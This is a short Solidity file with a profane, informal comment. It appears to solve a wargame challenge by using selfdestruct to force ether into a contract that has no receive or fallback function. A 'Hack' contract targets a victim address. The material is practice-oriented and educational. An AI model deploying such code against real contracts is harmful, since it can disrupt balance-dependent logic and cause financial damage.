/*
    So here's the solution of the freaking problem, it's simple if you really know what does 'selfdestruct' do, kind of a magical method and a real hacky tool tho..
    So normally we can't really send ether to some contract if they doesn't consists of 'fallback()' or 'receive()' function, but as I said there's a damn hack

    So 'selfdestruct' is normally used in conditions where you want to `kill` some contract i.e removing it permanently from the blockchain (Although I am not sure everything is destroyed, kind of doubtful that the transactions are still there ofcourse), but yea that particular contract won't be no longer accessible!!

    Actually selfdestruct is called in this way -> selfdestruct(address), where address should be payable and be a valid contract on the chain, and this address gonna be that contract where you will be sending the funds of your contract which you are deciding to destroy forever..
    Note: funds meant here by just ether, no token or nothing

    Well Now we got all the basic knowledge to solve this, let's fucking dive then!!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force{}

contract Hack{
    Force public force;

    constructor(address _victim) {
        force = Force(payable(_victim));
    }

    // This is the function, and look the address must be always a payable one
    function attack() external payable{
        selfdestruct(payable(address(force)));
    }
}